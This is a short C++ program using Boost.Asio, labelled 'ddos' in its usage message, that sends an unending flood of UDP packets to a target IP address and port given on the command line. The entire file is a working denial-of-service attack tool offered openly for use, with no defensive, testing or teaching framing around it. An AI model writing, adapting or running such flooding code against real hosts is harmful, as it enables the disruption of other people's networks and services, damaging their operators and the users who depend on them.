//
// Created by roxyp on 29/10/2024.
//

#include <iostream>
#include <boost/asio.hpp>

using namespace boost::asio;
using namespace boost::asio::ip;

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: ddos <target IP> <target port>\n";
        return 1;
    }

    try {
        io_service io_service;
        udp::socket socket(io_service, udp::endpoint(udp::v4(), 0));
        udp::endpoint target_endpoint(address::from_string(argv[1]), std::atoi(argv[2]));

        std::cout << "Sending flood to " << argv[1] << ":" << argv[2] << "\n";

        for (;;) {
            socket.send_to(buffer("Flood"), target_endpoint);
        }
    } catch (std::exception& e) {
        std::cerr << "Exception: " << e.what() << "\n";
    }

    return 0;
}
